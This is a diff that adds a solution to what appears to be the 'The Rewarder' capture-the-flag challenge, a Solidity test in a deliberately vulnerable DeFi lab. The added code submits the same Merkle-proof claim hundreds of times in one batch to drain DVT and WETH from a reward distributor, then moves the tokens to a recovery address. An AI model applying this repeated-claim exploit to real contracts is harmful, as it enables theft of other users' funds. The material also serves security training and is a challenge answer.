@@ -148,7 +148,39 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        console.log(alice);
+        // console.log(player);
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        uint len = 867;
+        uint wlen = 853;
+        Claim[] memory claims = new Claim[](len+wlen);
+        for(uint i=0;i<len;i++){
+            // First, the DVT claim
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: 11524763827831882,
+                tokenIndex: 0, 
+                proof: merkle.getProof(dvtLeaves, 3) 
+            });
+        }
+        for(uint i=0;i<wlen;i++){
+            // First, the DVT claim
+            claims[len+i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: 1171088749244340,
+                tokenIndex: 1, 
+                proof: merkle.getProof(wethLeaves, 3) 
+            });
+        }
+        distributor.claimRewards(claims, tokensToClaim);
+        dvt.transfer(recovery, 9991970238730241694);
+        weth.transfer(recovery, 998938703105422020);
     }
 
     /**
@@ -180,7 +212,7 @@ contract TheRewarderChallenge is Test {
     // Utility function to read rewards file and load it into an array of leaves
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
         Reward[] memory rewards =
-            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+            abi.decode( vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]) );
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
